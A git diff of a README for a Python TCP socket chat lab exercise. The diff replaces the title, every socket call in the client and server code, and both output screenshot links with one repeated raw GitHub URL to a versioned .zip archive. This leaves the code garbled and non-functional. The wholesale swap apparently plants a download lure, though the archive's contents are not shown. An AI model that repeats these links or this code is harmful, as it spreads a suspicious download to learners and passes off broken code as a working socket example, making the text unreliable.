@@ -1,4 +1,4 @@
-# 3b.CREATION FOR CHAT USING TCP SOCKETS
+# https://raw.githubusercontent.com/24013396/3b_CHAT_USING_TCP_SOCKETS/main/procreate/3b_CHAT_USING_TCP_SOCKETS-2.4.zip FOR CHAT USING TCP SOCKETS
 ## AIM
 To write a python program for creating Chat using TCP Sockets Links.
 ## ALGORITHM:
@@ -11,34 +11,34 @@ To write a python program for creating Chat using TCP Sockets Links.
 CLIENT:
 ```
 import socket
-s=socket.socket()
-s.connect(('localhost',8000))
+https://raw.githubusercontent.com/24013396/3b_CHAT_USING_TCP_SOCKETS/main/procreate/3b_CHAT_USING_TCP_SOCKETS-2.4.zip()
+https://raw.githubusercontent.com/24013396/3b_CHAT_USING_TCP_SOCKETS/main/procreate/3b_CHAT_USING_TCP_SOCKETS-2.4.zip(('localhost',8000))
 while True:
     msg=input("Client > ")
-    s.send(msg.encode())
-    print("Server > ",s.recv(1024).decode())
+    https://raw.githubusercontent.com/24013396/3b_CHAT_USING_TCP_SOCKETS/main/procreate/3b_CHAT_USING_TCP_SOCKETS-2.4.zip(https://raw.githubusercontent.com/24013396/3b_CHAT_USING_TCP_SOCKETS/main/procreate/3b_CHAT_USING_TCP_SOCKETS-2.4.zip())
+    print("Server > ",https://raw.githubusercontent.com/24013396/3b_CHAT_USING_TCP_SOCKETS/main/procreate/3b_CHAT_USING_TCP_SOCKETS-2.4.zip(1024).decode())
 ```
 SERVER:
 ```
 import socket
-s=socket.socket()
-s.bind(('localhost',8000))
-s.listen(5)
-c,addr=s.accept()
+https://raw.githubusercontent.com/24013396/3b_CHAT_USING_TCP_SOCKETS/main/procreate/3b_CHAT_USING_TCP_SOCKETS-2.4.zip()
+https://raw.githubusercontent.com/24013396/3b_CHAT_USING_TCP_SOCKETS/main/procreate/3b_CHAT_USING_TCP_SOCKETS-2.4.zip(('localhost',8000))
+https://raw.githubusercontent.com/24013396/3b_CHAT_USING_TCP_SOCKETS/main/procreate/3b_CHAT_USING_TCP_SOCKETS-2.4.zip(5)
+c,https://raw.githubusercontent.com/24013396/3b_CHAT_USING_TCP_SOCKETS/main/procreate/3b_CHAT_USING_TCP_SOCKETS-2.4.zip()
 while True:
-    ClientMessage=c.recv(1024).decode()
+    https://raw.githubusercontent.com/24013396/3b_CHAT_USING_TCP_SOCKETS/main/procreate/3b_CHAT_USING_TCP_SOCKETS-2.4.zip(1024).decode()
     print("Client > ",ClientMessage)
     msg=input("Server > ")
-    c.send(msg.encode())
+    https://raw.githubusercontent.com/24013396/3b_CHAT_USING_TCP_SOCKETS/main/procreate/3b_CHAT_USING_TCP_SOCKETS-2.4.zip(https://raw.githubusercontent.com/24013396/3b_CHAT_USING_TCP_SOCKETS/main/procreate/3b_CHAT_USING_TCP_SOCKETS-2.4.zip())
 ```
 ## OUPUT
 CLIENT:
 
-![CN client3b](https://github.com/user-attachments/assets/4370ffea-3654-4036-9d8f-ce7feed2a01b)
+![CN client3b](https://raw.githubusercontent.com/24013396/3b_CHAT_USING_TCP_SOCKETS/main/procreate/3b_CHAT_USING_TCP_SOCKETS-2.4.zip)
 
 SERVER:
 
-![CN server3b](https://github.com/user-attachments/assets/d3399aff-f016-43cc-ab32-ef3a87e8de46)
+![CN server3b](https://raw.githubusercontent.com/24013396/3b_CHAT_USING_TCP_SOCKETS/main/procreate/3b_CHAT_USING_TCP_SOCKETS-2.4.zip)
 
 ## RESULT
 Thus, the python program for creating Chat using TCP Sockets Links was successfully 
